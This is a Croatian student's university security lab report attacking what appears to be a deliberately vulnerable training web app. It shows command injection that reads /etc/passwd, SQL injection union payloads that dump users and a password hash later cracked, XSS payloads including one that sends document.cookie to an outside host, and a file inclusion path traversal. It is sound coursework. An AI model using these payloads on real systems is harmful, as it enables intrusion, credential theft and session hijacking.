SIGURNOST RAČUNALNIH SUSTAVA, 3. LABORATORIJSKA VJEŽBA
MIHAEL MILIČEVIĆ, 0036521706

========================================================================================================================================================================================================

1. ZADATAK: Command injection

>> Nakon unošenja narebde '1 | echo srs', primjećujemo da se ispisuje tekst 'srs'. Dakle, izvođenjem ove naredbe izvršila se proizvoljna naredba koju smo unijeli nakon '1 |'.

>> Zaključujemo da nakon '1 |' možemo unijeti proizvoljnu naredbu za koju želimo da se izvrši. S obzirom da želimo ispisati sadržaj datoteke /etc/passwd, koristit ćemo naredbu 'cat', koja kao argument prima datoteku čiji sadržaj ispisuje na standardni izlaz.

>> Unošenjem narebde '1 | cat /etc/passwd' dobijemo sljedeći ispis:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false

========================================================================================================================================================================================================

2. ZADATAK: SQL injection

>> Unošenjem naredbe 'or 1=1 union select first_name, last_name from users# dobijemo rezultat priložen u datoteci slika_01.png.

>> Primjećujemo da postoji jedan korisnik imena Pablo, i to je meta našeg napada. Zatim unosimo naredbu 'or 1=1 union select password, first_name from users# i dobijemo rezultat priložen u datoteci slika_02.png.

>> Primjećujemo da lozinka korisnika Pablo ima hash 0d107d09f5bbe40cade3de5c71e9e9b7.

>> Korištenjem alata John the Ripper, dolazimo do lozinke korisnika Pablo: letmein. Proces je priložen u datoteci slika_03.png.

========================================================================================================================================================================================================

3. ZADATAK: XSS

>> Unošenjem teksta <script>alert('test')</script> u polje message, dobijemo iskočni prozor upozorenja "test", i time vidimo da možemo izvršiti XSS napad.

>> Unošenjem teksta <script>alert(document.cookie)</script> dobijemo rezultat:
PHPSESSID=48snqhacgf1a1cf83p5se7n0s4

>> Polje message ima ograničenje broja znakova koje je jednako 50. Otvaranjem developer toolsa, možemo zaobići ovo ograničenje podižući ga na recimo 500 znakova.

>> Unošenjem naredbe <script>document.location.href="http://public.tel.fer.hr/srs?cookie="+document.cookie</script> na adresu http://public.tel.fer.hr/srs predajemo kolačiće s pomoću zahtjeva GET.

>> Kod XSS Reflected napada, koristimo istu skriptu, samo što skripta neće biti spremljena u bazu, nego u URL-u, kao što je prikazano u datoteci slika_04.png.

>> Kod XSS Reflected napada, konačni URL kojim se ukrade kolačić izgleda ovako:
http://public.tel.fer.hr/srs?cookie=PHPSESSID=48snqhacgf1a1cf83p5se7n0s4;%20security=low

========================================================================================================================================================================================================

4. ZADATAK: FILE INCLUSION

>> Klikanjem na poveznice file1.php, file2.php, file3.php, primjećujemo da se ime te datoteke nalazi kao argument page u URL-u, npr. http://172.17.0.2/vulnerabilities/fi/?page=file1.php.

>> Stoga ćemo probati unijeti kao parametar page ime datoteke za koju želimo da se ispiše, u ovom slučaju /etc/passwd, pa će nam URL izgledati kao http://172.17.0.2/vulnerabilities/fi/?page=/etc/passwd. Tada se ispiše sadržaj datoteke /etc/passwd, kao što se vidi u datoteci slika_05.png.

>> Od ovakvog napada se možemo zaštiti provođenjem validacije ulaza, odnosno, ne izvršiti naredbu za svako ime datoteke koje korisnik unese, nego prvo provjeriti je li to legalan ulaz.

========================================================================================================================================================================================================